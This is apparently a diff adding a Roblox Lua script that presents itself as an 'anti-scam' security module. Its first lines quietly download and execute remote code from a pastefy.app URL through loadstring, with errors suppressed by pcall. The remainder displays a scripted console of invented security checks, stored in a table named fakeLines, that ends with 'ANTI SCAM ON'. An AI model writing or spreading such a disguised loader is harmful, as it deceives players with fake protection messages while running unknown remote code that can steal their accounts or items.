@@ -1,0 +1,42 @@
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local console = Instance.new("TextLabel")
+console.Size = UDim2.new(0.5, 0, 0.4, 0)
+console.Position = UDim2.new(0, 5, 0, 5)
+console.BackgroundTransparency = 1
+console.TextColor3 = Color3.fromRGB(0, 255, 0)
+console.Font = Enum.Font.Code
+console.TextSize = 16
+console.TextXAlignment = Enum.TextXAlignment.Left
+console.TextYAlignment = Enum.TextYAlignment.Top
+console.Text = ""
+console.Parent = gui
+
+local fakeLines = {
+    "[SYSTEM] Initializing anti-scam module...",
+    "[SECURITY] Scanning scripts...",
+    "[SECURITY] Checking player data...",
+    "[NETWORK] Verifying connections...",
+    "[NETWORK] Firewall rules applied.",
+    "[ANALYSIS] Script injection blocked.",
+    "[ANALYSIS] All scans passed.",
+    "[MODULE] Loading defense protocols...",
+    "[MODULE] Encryption enabled.",
+    "[OK] Security status: STABLE"
+}
+
+task.spawn(function()
+    for _, line in ipairs(fakeLines) do
+        console.Text = console.Text .. line .. "\n"
+        task.wait(math.random(5, 12) / 10)
+    end
+    task.wait(0.5)
+    console.Text = console.Text .. "\nANTI SCAM ON"
+end)
